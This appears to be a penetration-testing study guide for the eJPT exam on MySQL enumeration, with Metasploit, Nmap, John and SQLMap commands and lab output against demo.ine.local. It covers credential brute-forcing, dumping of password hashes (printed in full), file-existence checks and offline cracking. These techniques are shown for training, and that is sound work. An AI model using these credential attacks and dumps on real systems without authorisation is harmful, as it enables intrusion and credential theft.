# 🗃️ MySQL Enumeration - Complete Database Assessment Guide

Complete guide for MySQL database enumeration and vulnerability assessment using multiple tools and techniques.  
**Location:** `05-service-enumeration/mysql-enumeration-complete.md`

## 🎯 What is MySQL Enumeration?

MySQL enumeration is the systematic process of gathering information about MySQL database servers to identify potential security weaknesses. This includes version detection, user account enumeration, database discovery, privilege assessment, and configuration analysis.

MySQL enumeration involves multiple phases:
- Service detection and version identification
- Authentication testing and user enumeration
- Database and table discovery
- File system interaction capabilities
- Hash extraction and privilege assessment

## 📦 Installation and Setup

### Prerequisites:
- Kali Linux or penetration testing distribution
- Metasploit Framework
- Nmap with MySQL scripts
- Network access to target MySQL service

### Installation:
```bash
# Update system and install required tools
apt update && apt upgrade -y

# Install MySQL client tools
apt install mysql-client -y

# Install Metasploit Framework (if not pre-installed)
apt install metasploit-framework -y

# Verify installations
mysql --version
# Expected output: mysql  Ver 8.0.x-x for Linux

msfconsole --version
# Expected output: Framework Version: 6.x.x

nmap --script-help mysql*
# Lists all available MySQL scripts
```

### Initial Configuration:
```bash
# Start Metasploit database
systemctl start postgresql
msfdb init

# Update Metasploit
msfupdate

# Start Metasploit console
msfconsole -q
```

## 🔧 Basic Usage and Syntax

### Basic Workflow:
1. **Discovery:** Identify MySQL services on target networks
2. **Version Detection:** Determine MySQL version and capabilities  
3. **Authentication Testing:** Test for weak/default credentials
4. **Enumeration:** Extract database structure and user information
5. **File System Access:** Test for file read/write capabilities
6. **Hash Extraction:** Dump password hashes for offline cracking

### Command Structure:
```bash
# Service Discovery
nmap -sV -p 3306 target_ip

# Metasploit Module Usage
use auxiliary/scanner/mysql/module_name
set RHOSTS target_ip
set USERNAME username
set PASSWORD password
run
```

## ⚙️ Command Line Options

### Nmap MySQL Scripts:
| Script | Purpose | Example |
|--------|---------|---------|
| `mysql-info` | Version and server information | `nmap --script mysql-info -p 3306 target` |
| `mysql-empty-password` | Test for empty passwords | `nmap --script mysql-empty-password -p 3306 target` |
| `mysql-users` | Enumerate MySQL users | `nmap --script mysql-users --script-args mysqluser=root,mysqlpass=pass -p 3306 target` |
| `mysql-databases` | List available databases | `nmap --script mysql-databases --script-args mysqluser=root,mysqlpass=pass -p 3306 target` |
| `mysql-variables` | Show MySQL variables | `nmap --script mysql-variables --script-args mysqluser=root,mysqlpass=pass -p 3306 target` |

### Metasploit MySQL Modules:
| Module | Purpose | Example |
|--------|---------|---------|
| `mysql_version` | Version detection | `use auxiliary/scanner/mysql/mysql_version` |
| `mysql_login` | Brute force authentication | `use auxiliary/scanner/mysql/mysql_login` |
| `mysql_enum` | Comprehensive enumeration | `use auxiliary/admin/mysql/mysql_enum` |
| `mysql_sql` | Execute SQL queries | `use auxiliary/admin/mysql/mysql_sql` |
| `mysql_file_enum` | File system enumeration | `use auxiliary/scanner/mysql/mysql_file_enum` |
| `mysql_hashdump` | Extract password hashes | `use auxiliary/scanner/mysql/mysql_hashdump` |
| `mysql_schemadump` | Dump database schema | `use auxiliary/scanner/mysql/mysql_schemadump` |

### MySQL Client Options:
| Option | Purpose | Example |
|--------|---------|---------|
| `-h hostname` | Specify host | `mysql -h 192.168.1.100 -u root -p` |
| `-u username` | Specify username | `mysql -u admin -p database_name` |
| `-p password` | Specify password | `mysql -u root -ppassword123` |
| `-P port` | Specify port | `mysql -h target -P 3306 -u root -p` |
| `-e "query"` | Execute single query | `mysql -u root -p -e "SHOW DATABASES;"` |

## 🧪 Real Lab Examples

### Example 1: Complete MySQL Enumeration Workflow
```bash
# Phase 1: Service Discovery
ping -c 4 demo.ine.local
# Output: Target reachable - 4 packets transmitted, 4 received, 0% packet loss

nmap demo.ine.local
# Output: PORT 3306/tcp open mysql

# Phase 2: Version Detection
msfconsole -q
use auxiliary/scanner/mysql/mysql_version
set RHOSTS demo.ine.local
run
# Output: [+] 192.89.45.3:3306 is running MySQL 5.5.61-0ubuntu0.14.04.1 (protocol 10)

# Phase 3: Authentication Testing
use auxiliary/scanner/mysql/mysql_login
set RHOSTS demo.ine.local
set USERNAME root
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run
# Output: [+] 192.89.45.3:3306 - Success: 'root:twinkle'

# Phase 4: Database Enumeration
use auxiliary/admin/mysql/mysql_enum
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run
# Output: MySQL Version: 5.5.61-0ubuntu0.14.04.1
# Server Hostname: demo.ine.local
# Data Directory: /var/lib/mysql/
# Logging of queries and logins: OFF
# Old Password Hashing Algorithm: OFF
# Loading of local files: ON
```

### Example 2: SQL Query Execution and Data Extraction
```bash
# Execute SQL commands
use auxiliary/admin/mysql/mysql_sql
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run
# Output: [+] 192.89.45.3:3306 - Sending statement: 'select version()'
# [+] 192.89.45.3:3306 - | 5.5.61-0ubuntu0.14.04.1 |

# File System Enumeration
use auxiliary/scanner/mysql/mysql_file_enum
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
set VERBOSE true
run
# Output: [+] 192.89.45.3:3306 MySQL - Logged in to '' with 'root':'twinkle'
# [+] 192.89.45.3:3306 MySQL - querying with 'SELECT * FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'mysql' AND TABLE_NAME = 'user';'
# [+] 192.89.45.3:3306 - /tmp is a directory and exists
# [+] 192.89.45.3:3306 - /etc/passwd is a file and exists
```

### Example 3: Password Hash Extraction
```bash
# Extract password hashes
use auxiliary/scanner/mysql/mysql_hashdump
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run
# Output: [+] 192.89.45.3:3306 - Saving HashString as Loot: root:*A0E23B565BACCE3E70D223915ABF25542540144
# [+] 192.89.45.3:3306 - Saving HashString as Loot: debian-sys-maint:*F4E71A08E02883688230B992EEAC70BC598FA723
# [+] 192.89.45.3:3306 - Saving HashString as Loot: filetest:*81F5E21E354D70D8446CDAA731AEBFB6AF209E18
# [+] 192.89.45.3:3306 - Saving HashString as Loot: ultra:*827841258900DAA81738418E11B73EB49659BFDD3

# Schema Dump
use auxiliary/scanner/mysql/mysql_schemadump
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run
# Output: Schema extracted with database structures, tables, and relationships
```

## 🎯 eJPT Exam Focus

### Essential Skills for eJPT:
- **MySQL Service Detection (25%)** - Identifying MySQL services on non-standard ports
- **Authentication Testing (30%)** - Testing default and weak credentials  
- **Database Enumeration (25%)** - Extracting database structure and sensitive data
- **File System Interaction (20%)** - Testing file read/write capabilities

### Critical Commands to Master:
```bash
# Service detection and version identification
nmap -sV -p 3306 target_ip
use auxiliary/scanner/mysql/mysql_version

# Authentication testing with wordlists
use auxiliary/scanner/mysql/mysql_login
set PASS_FILE /usr/share/wordlists/rockyou.txt

# Complete database enumeration
use auxiliary/admin/mysql/mysql_enum
set USERNAME root; set PASSWORD found_password

# SQL query execution for manual testing
use auxiliary/admin/mysql/mysql_sql
# Manual SQL: SHOW DATABASES; USE database_name; SHOW TABLES;
```

### eJPT Exam Scenarios:
1. **Database Server Assessment:** Student discovers MySQL service, tests authentication, and enumerates database structure
   - Required skills: Service detection, credential testing, database enumeration
   - Expected commands: nmap scan, mysql_login module, mysql_enum module
   - Success criteria: Successfully authenticate and extract database information

2. **Sensitive Data Extraction:** Student identifies and extracts sensitive information from MySQL databases  
   - Required skills: SQL query execution, file system interaction, hash extraction
   - Expected commands: mysql_sql module, mysql_hashdump module, custom SQL queries
   - Success criteria: Extract user credentials, sensitive data, or system information

### Exam Tips and Tricks:
- **Tip 1:** Always test default credentials (root:root, root:, admin:admin) before using wordlists
- **Tip 2:** Use mysql_enum module first for comprehensive information gathering
- **Tip 3:** Check file system permissions with mysql_file_enum for potential privilege escalation paths
- **Tip 4:** Document all discovered databases, tables, and user accounts for reporting

### Common eJPT Questions:
- How to identify MySQL version and configuration details
- Methods for testing MySQL authentication and user enumeration
- Techniques for extracting database schema and sensitive data

## ⚠️ Common Issues & Troubleshooting

### Issue 1: Connection Refused or Access Denied
**Problem:** Cannot connect to MySQL service or authentication fails
**Cause:** Network restrictions, incorrect credentials, or service configuration
**Solution:**
```bash
# Verify service is running and accessible
nmap -sV -p 3306 target_ip

# Test different authentication methods
use auxiliary/scanner/mysql/mysql_login
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt

# Check for empty password accounts
nmap --script mysql-empty-password -p 3306 target_ip
```

### Issue 2: Limited Information Disclosure
**Problem:** Successfully authenticated but getting minimal information
**Solution:**
```bash
# Use comprehensive enumeration module
use auxiliary/admin/mysql/mysql_enum
set USERNAME authenticated_user
set PASSWORD user_password

# Try direct SQL queries
use auxiliary/admin/mysql/mysql_sql
# Execute: SELECT user,host FROM mysql.user;
```

### Issue 3: Module Execution Failures
**Problem:** Metasploit modules fail to execute or return errors
**Prevention:**
```bash
# Update Metasploit database and modules
msfdb reinit
msfupdate

# Verify module options and syntax
show options
set RHOSTS target_ip
```

### Issue 4: Hash Extraction Fails
**Problem:** Cannot extract password hashes from mysql.user table
**Optimization:**
```bash
# Verify privileges and table access
use auxiliary/admin/mysql/mysql_sql
# Execute: SELECT * FROM information_schema.user_privileges WHERE grantee LIKE '%root%';

# Alternative hash extraction method
# Execute: SELECT host,user,password FROM mysql.user;
```

## 🔗 Integration with Other Tools

### Primary Integration: Nmap + Metasploit + John the Ripper
```bash
# Discovery phase with Nmap
nmap -sS -sV -p 3306 192.168.1.0/24

# Enumeration phase with Metasploit
msfconsole -x "use auxiliary/scanner/mysql/mysql_login; set RHOSTS target; run"

# Hash cracking phase with John
john mysql_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=mysql-sha1
```

### Secondary Integration: MySQL → SQLMap
```bash
# After obtaining credentials, test for SQL injection
sqlmap -d "mysql://root:password@target:3306/database" --tables --dump
```

### Advanced Workflows:
```bash
# Complete database assessment workflow
nmap_scan → mysql_version → mysql_login → mysql_enum → mysql_hashdump → john_crack
```

## 📝 Documentation and Reporting

### Evidence Collection Requirements:
1. **Screenshots:** Service detection, authentication success, enumeration results
2. **Command Outputs:** Version information, database lists, user accounts, hash dumps
3. **Log Files:** Metasploit logs, authentication attempts, SQL query results
4. **Hash Files:** Extracted password hashes for offline analysis

### Report Template Structure:
```markdown
## MySQL Database Assessment Results

### Target Information
- Target: demo.ine.local (192.89.45.3)
- Date/Time: 2024-07-11 08:48 IST
- MySQL Version: 5.5.61-0ubuntu0.14.04.1

### Commands Executed
```bash
# Service discovery
nmap -sV -p 3306 demo.ine.local

# Authentication testing
use auxiliary/scanner/mysql/mysql_login
set RHOSTS demo.ine.local; set USERNAME root; run

# Database enumeration
use auxiliary/admin/mysql/mysql_enum
set USERNAME root; set PASSWORD twinkle; run
```

### Key Findings
- MySQL service running on default port 3306
- Successful authentication with credentials root:twinkle
- Multiple databases accessible: information_schema, mysql, performance_schema
- Password hashes extracted for offline cracking

### Security Recommendations
- Change default root password to strong, complex password
- Disable remote root access if not required
- Implement network-level access controls
- Enable query logging for security monitoring
```

### Automation Scripts:
```bash
#!/bin/bash
# MySQL enumeration automation script
target=$1
output_dir="mysql_enum_$(date +%Y%m%d)"
mkdir -p $output_dir

# Service detection
nmap -sV -p 3306 $target > $output_dir/service_scan.txt

# Version detection
msfconsole -x "use auxiliary/scanner/mysql/mysql_version; set RHOSTS $target; run; exit" > $output_dir/version_info.txt

echo "MySQL enumeration complete. Results saved to $output_dir/"
```

## 📚 Additional Resources

### Official Documentation:
- MySQL Documentation: https://dev.mysql.com/doc/
- Metasploit MySQL Modules: https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/scanner/mysql
- Nmap MySQL Scripts: https://nmap.org/nsedoc/categories/database.html

### Learning Resources:
- MySQL Security Best Practices: Official MySQL security documentation
- Database Penetration Testing Course: Comprehensive database security testing
- Metasploit Unleashed MySQL Module: Detailed module usage examples

### Community Resources:
- MySQL Security Forums: https://forums.mysql.com/list.php?100
- Database Security Reddit: r/Database community discussions
- OWASP Database Security: Database security testing methodology

### Related Tools:
- SQLMap: Advanced SQL injection testing with MySQL support
- MySQL Workbench: GUI tool for database administration and analysis  
- Hydra: Alternative tool for MySQL brute force authentication
